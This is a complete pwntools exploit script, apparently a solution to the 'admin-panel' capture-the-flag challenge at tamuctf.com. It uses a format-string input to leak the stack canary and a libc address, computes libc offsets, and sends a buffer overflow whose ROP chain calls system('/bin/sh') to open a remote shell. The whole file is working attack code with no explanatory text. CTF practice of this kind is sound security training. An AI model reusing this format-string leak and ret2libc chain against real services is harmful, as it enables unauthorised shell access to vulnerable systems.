from pwn import *
from time import sleep

#context(arch='amd64', os='linux', endian='little')

#elf = ELF("admin-panel_patched")
#main = elf.symbols["main"]

libc_start_main_offset = 0x000000000002409b
pop_rdi_ret_offset = 0x23a5f
system_offset = 0x44af0
bin_sh_offset = 0x18052c

p = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")

#p = process("./admin-panel_patched")
p.recvline()
p.recvline()
p.sendline(b"adminaaaaaaaaaaa")
p.recvline()
p.sendline(b'secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p')
p.recvline()
leak_addrs = p.recvline().decode()[:-1].split(',')
stack_cookie = leak_addrs[0]
libc_leak = leak_addrs[1]
stack_cookie = int(stack_cookie, 16)
libc_leak = int(libc_leak, 16)
print(f"stack cookie is: {hex(stack_cookie)}")
print(f"leaked address is: {hex(libc_leak)}")
libc_entrypoint = libc_leak - libc_start_main_offset
pop_rdi_ret = libc_entrypoint + pop_rdi_ret_offset
#sleep(15)
payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa'
payload += p64(stack_cookie)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_offset + libc_entrypoint)
payload += p64(system_offset + libc_entrypoint)
#payload += b'BBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF'
#payload += p64(0)
#payload += p64(main)

p.recvuntil(b'2 or 3:')
p.sendline(b'2')
p.recvuntil(b'wrong:')
p.sendline(payload)

p.interactive()
